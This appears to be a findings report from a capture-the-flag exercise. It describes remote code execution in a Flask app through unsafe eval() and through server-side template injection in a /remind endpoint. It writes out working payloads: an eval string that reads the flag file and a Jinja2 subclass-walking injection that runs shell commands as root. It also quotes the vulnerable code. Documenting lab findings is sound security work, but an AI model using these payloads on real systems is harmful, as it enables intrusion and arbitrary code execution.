findings.title: Remote Code Execution via Unsafe eval() in Flask App (CTF Flag Captured)
findings.description: The flask_app container fetches a URL from nginx's /api/get endpoint, then fetches content from that URL and passes the JSON response's 'script' field directly to Python's eval() function without any sanitization. By setting the API URL to a malicious server returning {"script": "__import__('os').popen('cat /FLAG.txt').read()"}, arbitrary Python code execution is achieved on the flask_app container.

findings.title: Server-Side Template Injection (SSTI) in /remind endpoint leading to RCE
findings.description: The /remind endpoint passes user-controlled input (date parameter) directly into render_template_string() using Python's str.format(), which allows Server-Side Template Injection. An authenticated attacker can inject Jinja2 templates to achieve arbitrary code execution.
findings.evidence: SSTI confirmed: {{7*7}} evaluates to 49. RCE achieved via: {% for c in ''.__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}{% endif %}{% endfor %} returns uid=0(root) gid=0(root) groups=0(root). The vulnerable code in app.py: message = '''Reminder will be sent on {}'''.format(date); tmpl=render_template_string(message,date=date). The FLAG environment variable was empty in this container instance (FLAG=), and flag.txt was 0 bytes. The application writes os.getenv('FLAG', 'flag{this_is_a_fake_flag}') to flag.txt on startup.

reproduction.expected: Response contains 'Reminder will be sent on 49'
